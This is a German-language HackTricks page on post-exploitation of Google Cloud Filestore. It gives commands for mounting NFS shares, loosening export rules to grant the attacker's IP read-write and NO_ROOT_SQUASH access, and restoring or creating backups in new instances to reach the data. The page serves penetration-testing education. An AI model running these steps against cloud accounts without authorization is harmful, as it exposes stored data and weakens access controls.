# GCP - Filestore Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Filestore

Für weitere Informationen über Filestore siehe:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Mount Filestore

Ein gemeinsames Dateisystem **kann sensible Informationen enthalten**, die aus Sicht eines Angreifers interessant sind. Mit Zugriff auf das Filestore ist es möglich, es **zu mounten**:

<details>

<summary>Mount Filestore filesystem</summary>
```bash
sudo apt-get update
sudo apt-get install nfs-common
# Check the share name
showmount -e <IP>
# Mount the share
mkdir /mnt/fs
sudo mount [FILESTORE_IP]:/[FILE_SHARE_NAME] /mnt/fs
```
</details>

Um die IP-Adresse einer Filestore-Instanz zu finden, prüfen Sie den enumeration-Abschnitt der Seite:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Einschränkungen entfernen und zusätzliche Berechtigungen erhalten

Wenn sich der Angreifer nicht in einer IP-Adresse befindet, die Zugriff auf die Freigabe hat, Sie aber über ausreichende Berechtigungen verfügen, um sie zu ändern, ist es möglich, die Beschränkungen zu entfernen oder den Zugriff darauf zu erlauben. Es ist auch möglich, Ihrer IP-Adresse zusätzliche Privilegien zu gewähren, um Administratorzugriff auf die Freigabe zu erhalten:

<details>

<summary>Filestore-Instanz aktualisieren, um Zugriff zu erlauben</summary>
```bash
gcloud filestore instances update nfstest \
--zone=<exact-zone> \
--flags-file=nfs.json

# Contents of nfs.json
{
"--file-share":
{
"capacity": "1024",
"name": "<share-name>",
"nfs-export-options": [
{
"access-mode": "READ_WRITE",
"ip-ranges": [
"<your-ip-private-address>/32"
],
"squash-mode": "NO_ROOT_SQUASH",
"anon_uid": 1003,
"anon_gid": 1003
}
]
}
}
```
</details>

### Backup wiederherstellen

Wenn ein backup vorhanden ist, ist es möglich, es in einer bestehenden oder in einer neuen Instanz zu **wiederherzustellen**, sodass seine **Informationen zugänglich werden:**

<details>

<summary>Neue Instanz erstellen und backup wiederherstellen</summary>
```bash
# Create a new filestore if you don't want to modify the old one
gcloud filestore instances create <new-instance-name> \
--zone=<zone> \
--tier=STANDARD \
--file-share=name=vol1,capacity=1TB \
--network=name=default,reserved-ip-range=10.0.0.0/29

# Restore a backups in a new instance
gcloud filestore instances restore <new-instance-name> \
--zone=<zone> \
--file-share=<instance-file-share-name> \
--source-backup=<backup-name> \
--source-backup-region=<backup-region>

# Follow the previous section commands to mount it
```
</details>

### Backup erstellen und wiederherstellen

Wenn du **keinen Zugriff auf ein Share hast und es nicht ändern möchtest**, ist es möglich, **eine Sicherung davon zu erstellen** und **sie wie zuvor beschrieben wiederherzustellen**:

<details>

<summary>Backup erstellen und in neuer Instanz wiederherstellen</summary>
```bash
# Create share backup
gcloud filestore backups create <back-name> \
--region=<region> \
--instance=<instance-name> \
--instance-zone=<instance-zone> \
--file-share=<share-name>

# Follow the previous section commands to restore it and mount it
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
